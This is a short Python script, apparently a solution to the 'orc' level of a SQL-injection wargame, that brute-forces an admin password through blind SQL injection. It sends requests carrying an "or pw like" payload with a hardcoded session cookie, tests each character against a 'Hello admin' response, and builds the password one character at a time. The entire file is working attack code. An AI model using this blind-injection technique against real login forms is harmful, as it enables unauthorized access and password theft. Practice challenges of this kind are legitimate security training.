import requests
import re

target="http://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php"
cookie={'PHPSESSID':'pm8noisi6il72p88g3vg7edh85'}
charlist="1234567890abcdefghijklnmopqrstuvwxyzABCDEFGHIJKLNMOPQRSTUVWXYZ!@#$%^&*()"
password=""

for I in range(1,9):
    for j in range(72):
        sendurl=target+"?pw=%27or pw like %27"+password+charlist[j]+"%"
        text=requests.get(sendurl,cookies=cookie).text
        if re.search("Hello admin", text):
            password=password+charlist[j];
            print ("PASSWORD : %s"%password)
            break;
